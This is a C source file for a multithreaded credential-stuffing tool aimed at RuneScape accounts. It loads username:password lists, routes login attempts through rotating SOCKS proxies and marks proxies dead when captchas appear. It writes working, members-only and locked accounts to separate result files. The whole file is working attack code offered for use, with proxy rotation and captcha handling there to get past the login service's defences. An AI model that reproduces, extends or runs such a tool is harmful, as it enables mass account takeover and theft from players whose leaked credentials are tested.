#include <stdarg.h>
#include <stdio.h>
#include <pthread.h>
#include <string.h>
#include <stdbool.h>
#include <stdlib.h>
#include <unistd.h>
#include <getopt.h>
#include <ctype.h>
#include <signal.h>


#include <curl/curl.h>

#include "common.h"

struct accnode {
	char *username;
	char *password;
	volatile bool checked;
	volatile bool inprogress;
	struct accnode *next;
};

struct pxnode {
	char *proxy;
	volatile bool dead;
	volatile bool inprogress;
	volatile int retries;
	volatile int type;
	struct pxnode *next;
};


struct accnode *head = NULL;
struct pxnode *pxhead = NULL;


pthread_mutex_t account; //Accessing our accnode AND accessing checked_accounts.
pthread_mutex_t pthnum; //Accessing thread_num AND pxnode AND total_proxies AND dead_proxies.

volatile size_t thread_num = 0; //How many threads are currently running
volatile size_t checked_accounts = 0; //How many accounts have been checked (if this is the same as the amount as the imported amount, we can exit)
volatile size_t total_accounts = 0; // How many accounts we have to deal with in total
volatile size_t total_proxies = 0; //How many proxies we have to deal with in total
volatile size_t dead_proxies = 0; //How many proxies are 'dead'

volatile int keepRunning = 1; //Signal handler int

/*
	Quick stdup copy, since strdup is nonstandard
*/
char *strdup(const char *str) {

	size_t n = snprintf(NULL, 0, "%s", str);
	n++;
	char *dup = malloc(n);
	if(dup)
		snprintf(dup, n, "%s", str);
	return dup;
}

bool isAlphaNum(char *str) {
	char *tmp = str;
	while (*tmp)
		if (!(isalnum (*tmp++)))
			return false;
    return true;
}

bool isRSUsername(char *str) {
	char *tmp = str;
	while (*tmp)
		if (*tmp != '_' && *tmp != ' ' && *tmp != '-' && !isalnum(*tmp))
			return false;
		else
			tmp++;
		
    return true;
}

/*
	Push an account to the end of our account list.
*/
void push_acc(char *username, char *password) {
	//Sanity checks
	char *p;
	for (p = username; *p != '\0'; p++)
		*p = (char)tolower(*p);
	for (p = password; *p != '\0'; p++)
		*p = (char)tolower(*p);

	if(!strstr(username, "@") && strlen(username) > 12) {
		fdo_log(DBGLOG, "Skipping account %s:%s, as the username is longer than 12 character.", username, password);
		return;
	}
	if(!strstr(username, "@") && (!isRSUsername(username) || strstr(username, "fuck") || strstr(username, "shit") || strstr(username, "Mod ") || strstr(username, "Jagex"))) {
		fdo_log(DBGLOG, "Skipping account %s:%s, as the username containers characters that are not accepted by RS.", username, password);
		return;
	}
	if(*username == ' ' || username[strlen(username)-1] == ' ') {
		fdo_log(DBGLOG, "Skipping account \"%s\":%s, as the username starts/finishes with a space.", username, password);
		return;
	}

	if(strlen(password) > 20 || strlen(password) < 5) {
		fdo_log(DBGLOG, "Skipping account %s:%s, as the password is longer than 20 characters or shorter than 5.", username, password);
		return;
	}

	if(!isAlphaNum(password)) {
		fdo_log(DBGLOG, "Skipping account %s:%s, as the password is not alphanumeric.", username, password);
		return;
	}
	if(username == password) {
		fdo_log(DBGLOG, "Skipping account %s, as the username is the same as the password.", username, password);
		return;
	}
	if(strcmp(password, "runescape") == 0 || strcmp(password, "jagex") == 0 || strcmp(password, "password") == 0) {
		fdo_log(DBGLOG, "Skipping account %s:%s, as the password is unacceptable to RS.", username, password);
		return;
	}

	

	struct accnode *current = head;

	pthread_mutex_lock(&account);
	total_accounts++;
	while(current->next)
		current = current->next;
	current->next = malloc(sizeof *current->next);

	size_t plen = snprintf(NULL, 0, "%s", username);
	plen +=1;
	current->next->username = malloc(plen);
	snprintf(current->next->username, plen, "%s", username);

	plen = snprintf(NULL, 0, "%s", password);
	plen +=1;
	current->next->password = malloc(plen);
	snprintf(current->next->password, plen, "%s", password);

	current->next->checked = false;
	current->next->inprogress = false;
	current->next->next = NULL;
	pthread_mutex_unlock(&account);

}

void push_proxy(const char* proxy) {
	struct pxnode *current = pxhead;

	pthread_mutex_lock(&pthnum);
	total_proxies++;
	while(current->next)
		current = current->next;
	current->next = malloc(sizeof *current->next);

	size_t plen = snprintf(NULL, 0, "%s", proxy);
	plen +=1;
	current->next->proxy = malloc(plen);
	snprintf(current->next->proxy, plen, "%s", proxy);

	current->next->dead = false;
	current->next->type = 0;
	current->next->inprogress = false;
	current->next->retries = 0;
	current->next->next = NULL;
	pthread_mutex_unlock(&pthnum);

}


/*
	Set up our account list by reading O.Accounts, splitting the contents, and
	calling push_account() on them.
*/

size_t setupaccounts(void) {
	size_t i = 0;

	char *accountsetup = malloc(256);
	char *password = malloc(256);
	char *username = malloc(256);

	char *pacc = accountsetup;
	char *ppass = password;
	char *puser = username;

	do_log(GENLOG, "Adding accounts into our list.");
	while(fgets(accountsetup, 256, O.Accounts)) {
		if(*accountsetup && accountsetup[strlen(accountsetup)-1] == '\n')
			accountsetup[strlen(accountsetup)-1] = '\0';
		if(*accountsetup && accountsetup[strlen(accountsetup)-1] == '\r')
			accountsetup[strlen(accountsetup)-1] = '\0';
		if(*accountsetup && accountsetup[strlen(accountsetup)-1] == ' ')
			accountsetup[strlen(accountsetup)-1] = '\0';
		username = strtok(accountsetup, ":");
		if(!username) continue;
		password = strtok(NULL, ":");
		if(!password) continue;
		push_acc(username, password);
		i++;
	}

	free(pacc);
	free(ppass);
	free(puser);

	return i;
}

/*
	Set up our proxy list by reading O.Proxies and splitting the contents, and
	calling push_proxy() on them.
*/
size_t setupproxies(void) {
	size_t i = 0;

	char *proxysetup = malloc(32);

	char *pps = proxysetup;

	do_log(GENLOG, "Adding proxies into our list.");
	while(fgets(proxysetup, 32, O.Proxies)) {
		if(*proxysetup && proxysetup[strlen(proxysetup)-1] == '\n')
			proxysetup[strlen(proxysetup)-1] = '\0';
		if(*proxysetup && proxysetup[strlen(proxysetup)-1] == '\r')
			proxysetup[strlen(proxysetup)-1] = '\0';
		if(*proxysetup && proxysetup[strlen(proxysetup)-1] == ' ')
			proxysetup[strlen(proxysetup)-1] = '\0';
		if(strlen(proxysetup) < 11 || strlen(proxysetup) > 21 || !proxysetup) continue;
		push_proxy(proxysetup);
		i++;
	}

	free(pps);

	return i;
}

/*
	This is the main account checking function.
	It is multithreaded, and doesn't take any arguments.
*/
void *do_threaded() {
	char out[100000]; //Max response we will handle.

	struct accnode *current = head;

	char *username = NULL;
	char *password = NULL;
	char *proxy = NULL;

	pthread_mutex_lock(&account);
	while(current) {
		if(current->inprogress || current->checked) {
//			fdo_log(DBGLOG, "account: progress: %d checked?: %d", current->inprogress, current->checked);
			current = current->next;
			continue;
		}

		username = strdup(current->username);
		password = strdup(current->password);
		current->inprogress = true;
		break;
	}
	pthread_mutex_unlock(&account);

	struct pxnode *currentpx = pxhead;
	pthread_mutex_lock(&pthnum);
	while(currentpx) {
		if(currentpx->inprogress || currentpx->dead || currentpx->retries == O.retries) {
			currentpx = currentpx->next;
			continue;
		}

		proxy = strdup(currentpx->proxy);
		currentpx->inprogress = true;
		break;
	}
	pthread_mutex_unlock(&pthnum);

	if(!username || !password || !proxy) {
		free(username);
		free(password);
		free(proxy);
		pthread_mutex_lock(&pthnum);
		thread_num--;
		if(currentpx)
			currentpx->inprogress = false;
		pthread_mutex_unlock(&pthnum);
		pthread_mutex_lock(&account);
		if(current)
			current->inprogress = false;
		pthread_mutex_unlock(&account);
		pthread_exit(NULL);
		return NULL;
	}

	pthread_mutex_lock(&pthnum);
	int stype = (currentpx->retries % 2) ? CURLPROXY_SOCKS5 : CURLPROXY_SOCKS4;
	int rstype = currentpx->type;
	pthread_mutex_unlock(&pthnum);

	CURLcode resp = check(out, 300000, username, password, proxy, ((rstype == 0) ? stype : rstype));

	if(resp != CURLE_OK) {
		pthread_mutex_lock(&pthnum);
		currentpx->retries++;
		if(O.retries == currentpx->retries) {
			currentpx->dead = true;
			fdo_log(DBGLOG, "Proxy is now defined as dead.(%s)", currentpx->proxy);
			free(currentpx->proxy);
			currentpx->proxy = NULL;
			dead_proxies++;
		}
		pthread_mutex_unlock(&pthnum);

		//check() handles the DBGLOG for the case of resp != CURLE_OK.
	} else if(strstr(out, "Change Password")) {
		fdo_log( (strstr(out, "Currently Not a Member") ? VALIDLOG : VALIDLOGMB), "%s:%s (proxy: %s)", username, password, proxy);
		printf("%zu\n", strlen(out));
		pthread_mutex_lock(&account);
		current->checked = true;
		checked_accounts++;
		free(current->username); current->username = NULL;
		free(current->password); current->password = NULL;
		pthread_mutex_unlock(&account);

		pthread_mutex_lock(&pthnum);
		if(currentpx->retries > 0) {
			currentpx->type = (rstype == 0) ? stype : rstype;
			currentpx->retries--;
		}
		pthread_mutex_unlock(&pthnum);

	} else if(strstr(out, "Your Account is Locked")) {
		fdo_log(LOCKEDLOG, "%s:%s (proxy: %s)", username, password, proxy);

		pthread_mutex_lock(&account);
		current->checked = true;
		checked_accounts++;
		free(current->username); current->username = NULL;
		free(current->password); current->password = NULL;
		pthread_mutex_unlock(&account);

		pthread_mutex_lock(&pthnum);
		if(currentpx->retries > 0) {
			currentpx->type = (rstype == 0) ? stype : rstype;
			currentpx->retries--;
		}
		pthread_mutex_unlock(&pthnum);

	} else if(strstr(out, "email or password you entered was incorrect")) {
		fdo_log(INVALIDLOG, "%s:%s (proxy: %s)", username, password, proxy);

		pthread_mutex_lock(&account);
		current->checked = true;
		checked_accounts++;
		free(current->username); current->username = NULL;
		free(current->password); current->password = NULL;
		pthread_mutex_unlock(&account);

		pthread_mutex_lock(&pthnum);
		if(currentpx->retries > 0) {
			currentpx->type = (rstype == 0) ? stype : rstype;
			currentpx->retries--;
		}
		pthread_mutex_unlock(&pthnum);

	} else if(strstr(out, "Download sound as MP3")) {
		fdo_log(DBGLOG, "Captcha detected with the proxy %s.", proxy, username, password);

		pthread_mutex_lock(&pthnum);
		free(currentpx->proxy); currentpx->proxy = NULL;
		currentpx->dead = true;
		dead_proxies++;
		pthread_mutex_unlock(&pthnum);
	} else {
		fdo_log(DBGLOG, "Something strange has happened(Please report this). Going to continue. Debug info: resp: %d, strerr: %s, login: %s:%s, proxy: %s.", resp, curl_easy_strerror(resp), username, password, proxy);

		pthread_mutex_lock(&pthnum);
		currentpx->retries++;
		if(O.retries == currentpx->retries) {
			currentpx->dead = true;
			fdo_log(DBGLOG, "Proxy %s is now defined as dead.", currentpx->proxy);
			free(currentpx->proxy); currentpx->proxy = NULL;
			dead_proxies++;
		}
		pthread_mutex_unlock(&pthnum);
	}

	pthread_mutex_lock(&pthnum);
	currentpx->inprogress = false;
	thread_num--;
	pthread_mutex_unlock(&pthnum);

	pthread_mutex_lock(&account);
	current->inprogress = false;
	pthread_mutex_unlock(&account);


	free(password);
	free(username);
	free(proxy);

	pthread_exit(NULL);
	return NULL;

}

/*
	Print usage.
	exit()'s with signal 0.
*/
void usage(const char *p) {

	fprintf(stderr, "(C) 2015-2015 Joshua Rogers <honey@internot.info>\n"
			"Contact: @MegaManSec on Twitter.\n"
			"See COPYING for information regarding distribution.\n"
			"See README for information about the program and its abilities.\n\n\n");

	fprintf(stderr, "Usage: \n"
			"%s -t <numthreads> -o <outfile_base> -a <accountfile> -p <proxyfile> [-shvr]\n\n", p);

	fprintf(stderr, "Example: \n"
			"%s -t 10 -o outfile -a accounts.txt -p proxies.txt -r 8\n\n\n", p);

	fprintf(stderr, "Options:\n"
			"   -t, Required: The number of threads to running concurrently.\n"
			"       This must not exceed proxies or accounts. Minimum 1.\n"
			"   -o, Optional: The basename for where we will output results.\n"
			"       If the file does not exist, it will be created if possible.\n"
			"       If the outfile includes a directory, the directory MUST exist.\n"
			"   -s, Optional: Output logs to stdout, with no colors or extra information. -s takes priority over -v, however\n"
			"       -s may used with -o.\n"
			"       \033[31;01mIf -s OR -o is not set, the only output is colored output which goes to stderr.\033[0m\n"
			"   -a, Required: The file with our username:password list in it. Must be readable.\n"
			"   -p, Required: The file with our proxy:port list in it. Must be readable.\n"
			"   -h, Optional: This help page.\n"
			"   -v, Optional: Verbose mode; shows debugging information.\n"
			"   -r, Required: Proxy tries; How many times to try a proxy before it is\n"
			"       classified as 'dead' - Minimum 4! (this number is effectively half, due to proxytype switching)\n");
			

	exit(0);
}

/*
	Check if all files in our options have been opened.
	Should be called after opening our files, to ensure there are no errors.
*/

bool CheckOpen(void) {
	do_log(GENLOG, "Checking files.");
	if(O.basename)
		if(!O.Valid || !O.ValidMb || !O.Invalid || !O.Locked)
			return false;
	if(!O.Accounts || !O.Proxies)
		return false;

	return true;
}

/*
	Close all of the files in the struct
*/
void CloseFiles(void) {

	do_log(GENLOG, "Closing files.");

	if(O.Valid)
		fclose(O.Valid);
	if(O.ValidMb)
		fclose(O.ValidMb);
	if(O.Invalid)
		fclose(O.Invalid);
	if(O.Locked)
		fclose(O.Locked);
	if(O.Accounts)
		fclose(O.Accounts);
	if(O.Proxies)
		fclose(O.Proxies);

}

/*
	Open all the files needed, and put them into the struct.
	NOTE: We free the 'accountfile' and 'proxyfile' that is passed to this function
	We also free O.basename since it isn't needed after this function.
*/
void HandleStartFile(char *accountfile, char *proxyfile) {

	do_log(GENLOG, "Beginning file opening.");

	if(O.basename) {
		size_t plen;
		plen = snprintf(NULL, 0, "%s_valid.txt", O.basename);
		plen += 1;
		char *working = malloc(plen);
		snprintf(working, plen, "%s_valid.txt", O.basename);

		plen = snprintf(NULL, 0, "%s_members_valid.txt", O.basename);
		plen += 1;
		char *members = malloc(plen);
		snprintf(members, plen, "%s_members_valid.txt", O.basename);

		plen = snprintf(NULL, 0, "%s_invalid.txt", O.basename);
		plen += 1;
		char *invalid = malloc(plen);
		snprintf(invalid, plen, "%s_invalid.txt", O.basename);

		plen = snprintf(NULL, 0, "%s_locked.txt", O.basename);
		plen += 1;
		char *locked = malloc(plen);
		snprintf(locked, plen, "%s_locked.txt", O.basename);

		O.Valid = fopen(working, "a+");
		O.ValidMb = fopen(members, "a+");
		O.Invalid = fopen(invalid, "a+");
		O.Locked = fopen(locked, "a+");

		free(working);
		free(members);
		free(invalid);
		free(locked);
		free(O.basename);

	}

	O.Accounts = fopen(accountfile, "r");
	O.Proxies = fopen(proxyfile, "r");

	free(accountfile);
	free(proxyfile);

}

/*
	Free both account and proxy list.
	Does not free head->username and head->password, as that is usually handled by do_threaded().
	If we do need to free these two things, use freeListAll();
*/
void freeList(void) {
	struct accnode *tmp;

	while(head) {
		tmp = head;
		head = head->next;
		free(tmp);
	}

	struct pxnode *tmppx;

	while(pxhead) {
		tmppx = pxhead;
		pxhead = pxhead->next;
		free(tmppx);
	}
}
/*
	Frees all the CONTENTS of our lists. Does not free 'accnode'/'pxnode'
	Run freeList(); after this.
*/
void freeListContents(void) {
	struct accnode *tmp = head;

	while(tmp) {
		free(tmp->username);
		free(tmp->password);
		tmp = tmp->next;
	}

	struct pxnode *tmppx = pxhead;
	while(tmppx) {
		free(tmppx->proxy);
		tmppx = tmppx->next;

	}
}

/*
	Initializes our head, locks, and curl.
*/
void StartHead(void) {
	curl_global_init(CURL_GLOBAL_ALL);
	log_locks();
	init_locks();

	pthread_mutex_init(&account, NULL);
	pthread_mutex_init(&pthnum, NULL);

	head = malloc(sizeof *head);
	head->username = NULL;
	head->password = NULL;
	head->checked = true;
	head->inprogress = false;
	head->next = NULL;

	pxhead = malloc(sizeof *pxhead);
	pxhead->proxy = NULL;
	pxhead->dead = true;
	pxhead->type = 0;
	pxhead->inprogress = false;
	pxhead->retries = O.retries;
	pxhead->next = NULL;
}

/*
	Handle closing of files, and freeing of lists.
	Also handle SSL's locks(if needed)
	exit()'s with the signal 'sgnl'.

	Only to be called after StartHead() has been called!
*/
void end(int sgnl) {
	curl_global_cleanup();
	freeList();
	CloseFiles();
	kill_locks();
	exit(sgnl);
}

/*
	Check whether there is an account to process.
	Not threadsafe, and doesn't need to be, since it will be rerun anyways.
*/
bool acctocheck(void) {
	struct accnode *tmp = head;

	while(tmp) {
		if(tmp->inprogress == false && tmp->checked == false)
			return true;

		tmp = tmp->next;
	}
	return false;
}

/*
	Check whether there is an account to process.
	Not threadsafe, and doesn't need to be, since it will be rerun anyways.
*/
bool proxytouse(void) {
	struct pxnode *tmp = pxhead;

	while(tmp) {
		if(tmp->inprogress == false && tmp->dead == false && tmp->retries != O.retries)
			return true;

		tmp = tmp->next;
	}
	return false;
}

void intHandler(int n) {
    keepRunning = 0;
}

int main(int argc, char *argv[]) {

	//Initialize options.
	signal(SIGINT, intHandler);

	char *accountfile = NULL;
	char *proxyfile = NULL;

	int opt;
	while((opt = getopt(argc, argv, "t:o:a:p:r:hvs")) != -1) {
		switch(opt) {
		case 't':
			O.threads = (size_t)strtol(optarg, NULL, 10);
			break;
		case 'o':
			O.basename = strdup(optarg);
			break;
		case 'a':
			accountfile = strdup(optarg);
			break;
		case 'p':
			proxyfile = strdup(optarg);
			break;
		case 's':
			O.std = true;
			break;
		case 'v':
			O.verbose = true;
			break;
		case 'r':
			O.retries = strtol(optarg, NULL, 10);
			break;
		case 'h':
		case '?':
		default:
			usage(argv[0]);
		}
	}

	if(O.threads <= 0 || !accountfile || !proxyfile || 3 >= O.retries) {
		free(O.basename);
		free(accountfile);
		free(proxyfile);
		usage(argv[0]);
	}

	HandleStartFile(accountfile, proxyfile);
	if(!CheckOpen()) {
		CloseFiles();
		fdo_log(GENLOG, "Could not open all files. See %s -h for help.", argv[0]);
		exit(1);
	}
	do_log(GENLOG, "Initalizing our head.");
	StartHead();



	if(0 >= setupaccounts()) {
		fdo_log(GENLOG, "Could not load any accounts from the account file.\n"
				"Exiting. Run %s -h for help.\n", argv[0]);
		freeListContents();
		end(1);
	}
	if(0 >= setupproxies()) {
		fdo_log(GENLOG, "Could not load any proxies from the proxy file.\n"
				"Exiting. Run %s -h for help.\n", argv[0]);
		freeListContents();
		end(1);
	}


	if(O.threads > total_accounts) {
		do_log(GENLOG, "More threads than accounts. Lower the thread count.");
		freeListContents();
		end(1);
	}
	if(O.threads > total_proxies) {
		do_log(GENLOG, "More threads than proxies. Lower the thread count.");
		freeListContents();
		end(1);
	}

	size_t ithd = 0;

	fdo_log(GENLOG, "Starting with %zu accounts!", total_accounts);
	while(checked_accounts != total_accounts && total_proxies != dead_proxies && keepRunning) {
		sleep(1);
		pthread_mutex_lock(&pthnum);
		size_t chk = thread_num;
		pthread_mutex_unlock(&pthnum);
		if(chk == O.threads || !acctocheck() || !proxytouse()) {
			continue;
		}
		pthread_mutex_lock(&pthnum);
		thread_num++;
		pthread_mutex_unlock(&pthnum);
		//let do_threaded() decide whether or not we can pull an account(processing all already?)
		pthread_t thread;
		int perr = pthread_create(&thread, NULL, &do_threaded, NULL);			
		if(perr != 0)
			printf("pthread_create error(Please report this): %s\n", strerror(perr));
		pthread_detach(thread);
		ithd++;

	}

	//Just to double check...
	freeListContents();
	if(checked_accounts == total_accounts)
		do_log(GENLOG, "Finished!");
	if(total_proxies == dead_proxies)
		do_log(GENLOG, "Ran out of proxies! Exiting.");

	end(0);
}
